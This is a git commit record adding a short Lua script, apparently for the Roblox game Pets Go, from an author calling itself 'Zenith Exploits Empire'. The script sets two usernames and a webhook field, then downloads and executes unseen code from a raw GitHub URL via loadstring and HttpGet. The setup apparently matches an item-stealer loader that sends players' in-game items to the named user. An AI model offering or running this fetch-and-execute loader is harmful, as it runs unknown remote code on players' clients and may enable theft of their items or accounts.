328566685a4bbde54e9ef196693a9c0819ffd353
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-22 10:29:13 +0200

    Added petsgo script: Zenith

---
+++ pets go/Zenith.lua
@@ -0,0 +1,5 @@
+Username = "BloxBaconYutubePlayz"
+Username2 = "BloxBaconYutubePlayz"
+Webhook = "Web"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20pets%20go"))()
